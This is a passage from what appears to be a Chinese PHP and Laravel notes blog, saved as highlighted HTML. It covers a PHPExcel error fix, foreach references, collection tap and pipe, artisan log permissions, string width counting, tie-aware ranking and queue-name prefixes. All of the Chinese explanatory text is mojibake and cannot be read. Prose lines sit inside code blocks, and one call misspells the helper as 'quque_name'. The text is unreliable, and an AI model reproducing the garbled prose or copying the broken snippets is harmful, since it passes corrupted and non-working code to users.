class="keyword">break</span>;<span class="comment">//è¿™æ˜¯581è¡Œ</span></span><br><span class="line">        &#125; elseif(is_string($value)) &#123;</span><br><span class="line">            <span class="comment">//  Errors</span></span><br><span class="line">            <span class="keyword">if</span> ((strlen($value) &gt; <span class="number">0</span>) &amp;&amp; ($value&#123;<span class="number">0</span>&#125; == <span class="string">'#'</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         <span class="keyword">return</span> è·³å‡ºå½“å‰å‡½æ•°æˆ–è€…å¾ªç¯ç›´æ¥è¿”å› <span class="keyword">break</span> å¹¶ä¼šæ‰§è¡Œè€ŒæŠ¥é”™https:<span class="comment">//learnku.com/articles/26675</span></span><br><span class="line">        </span><br><span class="line">        æ–¹æ¡ˆ <span class="number">1</span>: å°† <span class="number">581</span> è¡Œçš„ <span class="keyword">break</span> æ³¨é‡Šæ‰</span><br><span class="line">        </span><br><span class="line">        æ–¹æ¡ˆ <span class="number">2</span> : å°† PHPExcel å‡çº§åˆ° <span class="number">1.81</span> ç‰ˆæœ¬ä»¥ä¸Š</span><br><span class="line">        </span><br><span class="line">        æ–¹æ¡ˆä¸‰ï¼šä½¿ç”¨ PHPExcel çš„å‡çº§äº§å“ PhpSpreadsheet</span><br><span class="line">        </span><br><span class="line">        æ–¹æ¡ˆ <span class="number">1</span> ä¿®æ”¹æºç  ä¸æ¨è</span><br><span class="line">        æ–¹æ¡ˆ <span class="number">2</span>PHPExcel å·²ä¸å†ç»´æŠ¤ æ•…ä¸æ¨è</span><br><span class="line">        å¯¹äºæ¡†æ¶ç‰ˆæœ¬å›½è¿‡è€ æˆ–ç»å¤šæ‰‹çš„é¡¹ç›® å»ºè®®ä½¿ç”¨ æ–¹æ¡ˆ <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        æ–¹æ¡ˆ <span class="number">3</span> ä¸º PHPExcel çš„æ›¿ä»£å“å‡çº§äº§å“ è€Œä¸”åœ¨ç»´æŠ¤ æ–°é¡¹ç›®æ¨èæ–¹æ¡ˆ <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        PHPExcel <span class="number">1.8</span><span class="number">.1</span> åœ°å€ https:<span class="comment">//github.com/PHPOffice/PHPExcel/commit/372c7cbb695a6f6f1e62649381aeaa37e7e70b32</span></span><br><span class="line">        </span><br><span class="line">        PhpSpreadsheet å®‰è£… å¦‚ä¸‹</span><br><span class="line">        </span><br><span class="line">        æ–‡æ¡£åœ°å€ï¼šhttps:<span class="comment">//phpspreadsheet.readthedocs.io/en/latest/#getting-started</span></span><br><span class="line">        </span><br><span class="line">        GitHub ä¸‹è½½ï¼šhttps:<span class="comment">//github.com/PHPOffice/PhpSpreadsheet</span></span><br><span class="line">        </span><br><span class="line">        composer å®‰è£…ï¼šcomposer <span class="built_in">require</span> phpoffice/phpspreadsheet</span><br><span class="line">        </span><br><span class="line">        PHPExcel ä¸ PhpSpreadsheetï¼Ÿ</span><br><span class="line">        </span><br><span class="line">        PhpSpreadsheet æ˜¯ PHPExcel çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬ã€‚å®ƒæ‰“ç ´äº†å…¼å®¹æ€§ï¼Œå¤§å¤§æé«˜äº†ä»£ç åº“è´¨é‡ï¼ˆå‘½åç©ºé—´ï¼ŒPSR åˆè§„æ€§ï¼Œæœ€æ–° PHP è¯­è¨€åŠŸèƒ½çš„ä½¿ç”¨ç­‰ï¼‰ã€‚</span><br><span class="line">        </span><br><span class="line">        å› ä¸ºæ‰€æœ‰çš„åŠªåŠ›éƒ½è½¬ç§»åˆ°äº† PhpSpreadsheetï¼Œæ‰€ä»¥ä¸å†ç»´æŠ¤ PHPExcelã€‚PHPExcelï¼Œè¡¥ä¸å’Œæ–°åŠŸèƒ½çš„æ‰€æœ‰è´¡çŒ®éƒ½åº”è¯¥ä»¥ PhpSpreadsheet master åˆ†æ”¯ä¸ºç›®æ ‡ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$data=array(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br><span class="line">  foreach($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">       $value=&amp;$data[$key];</span><br><span class="line">  &#125;</span><br><span class="line">é—®é¢˜<span class="number">1</span>:ç¨‹åºæ‰§è¡Œæ—¶ï¼Œæ¯ä¸€æ¬¡å¾ªç¯ç»“æŸåå˜é‡$dataçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿè¯·è§£é‡Šã€‚</span><br><span class="line">é—®é¢˜<span class="number">2</span>:ç¨‹åºæ‰§è¡Œå®Œåï¼Œå˜é‡$dataçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿè¯·è§£é‡Šã€‚</span><br><span class="line"><span class="comment">//ç¬¬ä¸€æ¬¡éå† ç»“æœè¿˜æ˜¯ ã€a,b,cã€‘</span></span><br><span class="line"><span class="comment">//ç¬¬äºŒæ¬¡éå†</span></span><br><span class="line">$data[<span class="number">0</span>]=<span class="string">'a'</span>;<span class="comment">//ç¬¬ä¸€æ¬¡éå†çš„æ—¶å€™$data[0]=a</span></span><br><span class="line">$val=&amp;$data[<span class="number">0</span>];<span class="comment">//è¿™è¾¹å·²ç»æŠŠ$data[0]å¼•ç”¨æŒ‡å‘$val ç¬¬ä¸€æ¬¡éå†ä»¥å</span></span><br><span class="line">$val=b <span class="comment">//ç°åœ¨$val ä¸€æ—¦å˜äº† é‚£ä¹ˆ$data[0]ä¹Ÿå°±æ”¹å˜äº† æ‰€ä»¥å˜æˆ$data[0]=b</span></span><br><span class="line">$data=[b,b,c];<span class="comment">//æœ€åç»“æœå˜æˆäº†</span></span><br><span class="line"><span class="comment">//ç¬¬ä¸‰æ¬¡éå†</span></span><br><span class="line">$data[<span class="number">1</span>]=b;<span class="comment">//ç¬¬äºŒæ¬¡éå†çš„æ—¶å€™$data[1]å˜æˆäº†b</span></span><br><span class="line">$val=&amp;$data[<span class="number">1</span>];<span class="comment">//ç¬¬äºŒæ¬¡éå†çš„æ—¶å€™$valçš„å¼•ç”¨å˜æˆäº†$data[1]</span></span><br><span class="line">$val=c;<span class="comment">//æ‰€ä»¥è¿™è¾¹$valå˜æˆäº†c é‚£ä¹ˆ$data[1]ä¹Ÿå°±å˜æˆäº†c</span></span><br><span class="line">$data=[<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'c'</span>]<span class="comment">//æœ€åç»“æœå˜æˆäº†</span></span><br><span class="line"><span class="comment">//æœ€åçš„$dataçš„ç»“æœhttps://learnku.com/articles/26374</span></span><br><span class="line">ã€b,c,cã€‘</span><br><span class="line">list($b, $a) = array($a, $b);</span><br></pre></td></tr></table></figure>
<h3 id="tap"><a href="#tap" class="headerlink" title="tap"></a>tap</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$items = [</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'David Charleston'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Blain Charleston'</span>, <span class="string">'member'</span> =&gt; <span class="number">0</span>, <span class="string">'active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Megan Tarash'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jonathan Phaedrus'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Paul Jackson'</span>, <span class="string">'member'</span> =&gt; <span class="number">0</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>]</span><br><span class="line">];</span><br><span class="line">å…ˆå°†æ•°ç»„è½¬ä¸ºé›†åˆï¼Œå†è¿›è¡Œæ•°æ®çš„è¿‡æ»¤ï¼Œæœ€ååœ¨ä¸¤ä¸ªä¸åŒçš„èŠ‚ç‚¹è°ƒç”¨ tap æ–¹æ³•ï¼Œè¿”å›æ‰“å°ç»“æœï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collect($items)</span><br><span class="line">    -&gt;where(<span class="string">'active'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var_dump($collection-&gt;pluck(<span class="string">'name'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">    -&gt;where(<span class="string">'member'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var_dump($collection-&gt;pluck(<span class="string">'name'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">ç¬¬ä¸€æ¬¡è°ƒç”¨ tap æ–¹æ³•è¾“å‡ºç»“æœï¼šhttps:<span class="comment">//learnku.com/laravel/t/26361</span></span><br><span class="line"></span><br><span class="line">David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson</span><br><span class="line">ç¬¬äºŒæ¬¡è°ƒç”¨ tap æ–¹æ³•è¾“å‡ºç»“æœï¼š</span><br><span class="line"></span><br><span class="line">David Charleston, Megan Tarash, Jonathan Phaedrus</span><br><span class="line">Tap vs Pipe</span><br><span class="line"></span><br><span class="line">Laravel ä¹Ÿæä¾›äº†å¦ä¸€ä¸ªç±»ä¼¼ tap çš„é›†åˆæ“ä½œæ–¹æ³• -- pipeï¼Œä¸¤è€…åœ¨é›†åˆè°ƒç”¨ä¸Šå¾ˆç±»ä¼¼ï¼Œå´æœ‰ä¸€ä¸ªä¸»è¦çš„åŒºåˆ«ï¼š</span><br><span class="line"></span><br><span class="line">é€šè¿‡è°ƒç”¨ tap æ–¹æ³•ä¸ä¼šæ”¹å˜åŸé›†åˆçš„ç»“æœï¼Œè€Œ pipe æ–¹æ³•ä¼šæ ¹æ®è¿”å›å€¼ä¿®æ”¹å…ƒé›†åˆçš„ç»“æœã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collect($items)</span><br><span class="line">    -&gt;where(<span class="string">'active'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;pipe(<span class="function"><span class="keyword">function</span> (<span class="params">$collection</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $collection-&gt;push([<span class="string">'name'</span> =&gt; <span class="string">'John Doe'</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson, John Doe</span></span><br></pre></td></tr></table></figure>
<h3 id="artisanæ—¥å¿—-root-æƒé™è§£å†³"><a href="#artisanæ—¥å¿—-root-æƒé™è§£å†³" class="headerlink" title="artisanæ—¥å¿— root æƒé™è§£å†³"></a>artisanæ—¥å¿— root æƒé™è§£å†³</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bootstrap/app.php ä¸­å†™å…¥ä»¥ä¸‹é…ç½®ï¼š </span><br><span class="line">https:<span class="comment">//learnku.com/articles/26444</span></span><br><span class="line">$app-&gt;configureMonologUsing(<span class="function"><span class="keyword">function</span>(<span class="params">Monolog\Logger $monolog</span>) </span>&#123;</span><br><span class="line">    $filename = storage_path(<span class="string">'logs/laravel-'</span>.php_sapi_name().<span class="string">'.log'</span>);</span><br><span class="line">    $handler = <span class="keyword">new</span> Monolog\Handler\RotatingFileHandler($filename);</span><br><span class="line">    $monolog-&gt;pushHandler($handler);</span><br><span class="line">&#125;);</span><br><span class="line">æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯ç”¨ www ç”¨æˆ·æ‰§è¡Œ artisan å‘½ä»¤ï¼Œå› ä¸ºä¸å…‰æ˜¯æ—¥å¿—ï¼Œè¿˜æœ‰å¯èƒ½æœ‰ç¼“å­˜ã€ storage ç­‰æ–‡ä»¶å¯èƒ½è¢« root ç”¨æˆ·åˆ›å»ºè€Œå¯¼è‡´ www ç”¨æˆ·æ— æƒæ“ä½œã€‚</span><br><span class="line">è„šæœ¬å†™åœ¨ crontab ä¸­çš„ï¼Œå¦‚æœæˆ‘æƒ³ç”¨ www ç”¨æˆ·æ‰§è¡Œ artisan å‘½ä»¤ï¼Œæˆ‘åº”è¯¥æ€ä¹ˆå†™ crontab å‘¢ crontab -e -u www</span><br><span class="line">php cli æˆ–è€… fpm éƒ½æ˜¯ç”¨ www ç”¨æˆ·å»æ‰§è¡Œ å°±ä¸ä¼šå‡ºç°ä½ è¿™ä¸ªé—®é¢˜çš„</span><br><span class="line">ä¸æƒ³ä½¿ç”¨å•ç‹¬çš„ç”¨æˆ·é…ç½® crontabï¼Œä¹Ÿå¯ä»¥è¿™ä¹ˆå¹²ï¼Œæ¯”å¦‚ï¼šé…ç½®åœ¨ root è´¦å·ä¸‹</span><br><span class="line"></span><br><span class="line">su www -s /bin/bash -c â€œphp artisan schedule:runâ€</span><br></pre></td></tr></table></figure>
<h3 id="è‹±æ–‡å­—ç¬¦å -0-5-ä¸ªï¼Œä¸­æ–‡å­—ç¬¦å -1-ä¸ª"><a href="#è‹±æ–‡å­—ç¬¦å -0-5-ä¸ªï¼Œä¸­æ–‡å­—ç¬¦å -1-ä¸ª" class="headerlink" title="è‹±æ–‡å­—ç¬¦å  0.5 ä¸ªï¼Œä¸­æ–‡å­—ç¬¦å  1 ä¸ª"></a>è‹±æ–‡å­—ç¬¦å  0.5 ä¸ªï¼Œä¸­æ–‡å­—ç¬¦å  1 ä¸ª</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/4956/following-my-unique-needs-of-the-english-characters-accounted-for-05-chinese-characters-accounted-for-1#topnav</span></span><br><span class="line">$double = str_word_count(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—å•å­—èŠ‚.</span></span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z0-9_]/'</span>, $value, $single);</span><br><span class="line">    $single = count($single[<span class="number">0</span>]) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤šå­èŠ‚é•¿åº¦.</span></span><br><span class="line">    $double = mb_strlen(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $value));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">the_fucking_length_function</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(mb_convert_encoding($str, <span class="string">'GB2312'</span>)) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">$length = (strlen($value) + mb_strlen($value)) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">//è¿™ä¸ªæ–¹æ³•æ˜¯å¥½çš„ï¼Œç¼ºç‚¹å°±åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯ç²¾åº¦é—®é¢˜ï¼Œå› ä¸º utf-8 ä¸­åªæœ‰ä¸¤ä¸‡å¤šä¸ªæ±‰å­—æ˜¯ 3 å­—èŠ‚ï¼Œè¿˜æœ‰å…­ä¸‡å¤šçš„ä¸å¸¸ç”¨æ±‰å­—æ˜¯ 4 å­—èŠ‚çš„ï¼Œé™„å¸¦ emoji ä¹‹ç±»çš„å°±</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">mbstrlen</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ceil((strlen($str) + mb_strlen($str, <span class="string">"UTF8"</span>)) / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_display_len</span> (<span class="params">string $str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z0-9_]/'</span>, $str, $single);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count($single[<span class="number">0</span>]) / <span class="number">2</span> + mb_strlen(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $str));</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//www.php.net/manual/zh/function.mb-strwidth.php</span></span><br></pre></td></tr></table></figure>
<h3 id="bas64ç®€å†"><a href="#bas64ç®€å†" class="headerlink" title="bas64ç®€å†"></a>bas64ç®€å†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/25907</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-æ’åç®—æ³•æ”¯æŒé‡å¤æ’å"><a href="#PHP-æ’åç®—æ³•æ”¯æŒé‡å¤æ’å" class="headerlink" title="PHP æ’åç®—æ³•æ”¯æŒé‡å¤æ’å"></a>PHP æ’åç®—æ³•æ”¯æŒé‡å¤æ’å</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/26769</span></span><br><span class="line">$arr = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">10</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">2</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">3</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">50</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">4</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">50</span>,</span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line">ä½ æƒ³ä»å°åˆ°å¤§ï¼Œå–å‡ºå‰ä¸‰åï¼Œå¦‚æœç¬¬å››åå’Œç¬¬ä¸‰åä¹Ÿç›¸åŒï¼Œä¹Ÿå–å‡ºæ¥</span><br><span class="line"></span><br><span class="line">å…ˆæŒ‰ score æ’åº</span><br><span class="line"></span><br><span class="line">array_multisort(array_column($arr,<span class="string">'score'</span>),SORT_ASC,$arr);</span><br><span class="line">å‰ä¸‰å</span><br><span class="line"></span><br><span class="line"> $results = array_slice($arr, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">true</span>);</span><br><span class="line">ç„¶åå‰ä¸‰åçš„æœ€åä¸€åå’Œä¹‹åçš„æ¯”è¾ƒ</span><br><span class="line"></span><br><span class="line">$length = count($arr);</span><br><span class="line">$resultLength = count($results);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$resultLength æ¯” $lengthå°è¯´æ˜$arr çš„è¿˜æœ‰å…ƒç´ ï¼Œå¦åˆ™å®ƒä»¬ä¿©å°±ç›¸ç­‰äº†ã€‚ç„¶åæ¯”è¾ƒkeyå’Œkey+1çš„å€¼ã€‚</span></span><br><span class="line">æé™æ˜¯æ‰€æœ‰çš„äººéƒ½å’Œç¬¬ä¸‰åç›¸åŒï¼Œè‡ªè¡Œåˆ¤æ–­æ˜¯å¦éœ€è¦æ‰€æœ‰äººéƒ½èƒœå‡ºï¼Œæ¥é™åˆ¶ $resultLength çš„é•¿åº¦</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($resultLength&lt;$length &amp;&amp;$results[$resultLength<span class="number">-1</span>][<span class="string">'score'</span>]==$arr[$resultLength][<span class="string">'score'</span>])&#123;</span><br><span class="line">            array_push($results,$arr[$resultLength]);</span><br><span class="line">            $resultLength = count($results);</span><br><span class="line">        &#125;</span><br><span class="line">æœ€åå¦‚æœè¦åˆ¤æ–­æŸä¸€ç”¨æˆ·æ˜¯å¦èƒœå‡º</span><br><span class="line"></span><br><span class="line">$ifWinner = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(in_array($id,array_column($results,<span class="string">'id'</span>)))&#123;</span><br><span class="line">       $ifWinner = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¤šä¸ª-Laravel-åº”ç”¨-queue-é˜Ÿåˆ—æ‰§è¡Œæ—¶ä¼šäº’ä¸²"><a href="#å¤šä¸ª-Laravel-åº”ç”¨-queue-é˜Ÿåˆ—æ‰§è¡Œæ—¶ä¼šäº’ä¸²" class="headerlink" title="å¤šä¸ª Laravel åº”ç”¨ queue é˜Ÿåˆ—æ‰§è¡Œæ—¶ä¼šäº’ä¸²"></a>å¤šä¸ª Laravel åº”ç”¨ queue é˜Ÿåˆ—æ‰§è¡Œæ—¶ä¼šäº’ä¸²</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">app/Libriries/helper.php ï¼Œå¯ä»¥å†™åœ¨ä½ ä»»ä½•æƒ³æ”¾çš„åœ°æ–¹</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¤šä¸ª laravel é¡¹ç›®ï¼Œå¦‚æœ --queue ç›¸åŒä¼šäº’ä¸²</span></span><br><span class="line"><span class="comment"> * è¿™é‡Œç»Ÿä¸€åŠ ä¸ªå½“å‰é¡¹ç›®åçš„å‰ç¼€æ¥åŒºåˆ†</span></span><br><span class="line"><span class="comment"> * @param $name</span></span><br><span class="line"><span class="comment"> * @return string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">queue_name</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">    $name_trans = [];</span><br><span class="line">    foreach(explode(<span class="string">','</span>,$name) <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        $name_trans[] = str_slug(config(<span class="string">'app.name'</span>) . <span class="string">' '</span> . $v, <span class="string">'_'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode(<span class="string">','</span>,$name_trans);</span><br><span class="line">&#125;</span><br><span class="line">ä¿®æ”¹æ¯ä¸ª Job çš„ $queue æ·»åŠ  queue_name ()</span><br><span class="line"></span><br><span class="line">namespace App\Jobs;</span><br><span class="line"><span class="comment">// çœç•¥...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApiBehavior</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// æ·»åŠ è¿™ä¸€è¡Œ</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;queue = queue_name(<span class="string">'ä½ çš„é˜Ÿåˆ—å'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ†å‘é˜Ÿåˆ—æ—¶ï¼Œç…§å¸¸åˆ†å‘å³å¯</span></span><br><span class="line">ApiBehavior::dispatch()</span><br><span class="line"><span class="comment">// æˆ–è€…è¿™ç§åˆ†å‘æ—¶æŒ‡å®šï¼Œå¯ä»¥çœç•¥ç¬¬äºŒæ­¥ã€‚</span></span><br><span class="line">ApiBehavior::dispatch()-&gt;onQueue(quque_name(<span class="string">'ä½ çš„é˜Ÿåˆ—å'</span>))</span><br><span 